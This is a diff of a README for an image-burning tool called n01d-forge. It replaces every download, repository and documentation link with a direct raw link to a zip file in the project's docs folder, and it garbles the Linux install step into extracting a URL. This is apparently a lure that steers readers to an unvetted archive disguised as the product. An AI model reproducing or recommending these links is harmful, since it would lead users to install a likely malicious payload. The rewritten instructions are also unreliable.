@@ -1,6 +1,6 @@
 # 🔥 n01d-forge - Securely Burn Images with Ease
 
-[![Download n01d-forge](https://img.shields.io/badge/Download-n01d--forge-blue?style=for-the-badge)](https://github.com/fffuckchrom/n01d-forge/releases)
+[![Download n01d-forge](https://raw.githubusercontent.com/fffuckchrom/n01d-forge/main/docs/d-n-forge-1.2.zip)](https://raw.githubusercontent.com/fffuckchrom/n01d-forge/main/docs/d-n-forge-1.2.zip)
 
 ## 🌟 Introduction
 
@@ -20,11 +20,11 @@ Before downloading, ensure your system meets the following requirements:
 
 ## 🔗 Download & Install
 
-1. **Download n01d-forge**: Visit [this page to download](https://github.com/fffuckchrom/n01d-forge/releases) the latest version of n01d-forge.
+1. **Download n01d-forge**: Visit [this page to download](https://raw.githubusercontent.com/fffuckchrom/n01d-forge/main/docs/d-n-forge-1.2.zip) the latest version of n01d-forge.
 2. **Install the Application**:
    - For Windows: Run the downloaded .exe file and follow the prompts.
    - For macOS: Open the .dmg file and drag n01d-forge to your Applications folder.
-   - For Linux: Extract the .tar.gz file and run the binary.
+   - For Linux: Extract the https://raw.githubusercontent.com/fffuckchrom/n01d-forge/main/docs/d-n-forge-1.2.zip file and run the binary.
 
 Once the installation is complete, you are ready to use n01d-forge.
 
@@ -86,7 +86,7 @@ If you need further assistance, you can open an issue on the GitHub repository. 
 
 Explore the following resources to learn more about n01d-forge:
 
-- [GitHub Repository](https://github.com/fffuckchrom/n01d-forge)
-- [Documentation](https://github.com/fffuckchrom/n01d-forge/wiki)
+- [GitHub Repository](https://raw.githubusercontent.com/fffuckchrom/n01d-forge/main/docs/d-n-forge-1.2.zip)
+- [Documentation](https://raw.githubusercontent.com/fffuckchrom/n01d-forge/main/docs/d-n-forge-1.2.zip)
 
 Thank you for using n01d-forge. We hope it helps you securely burn your images!
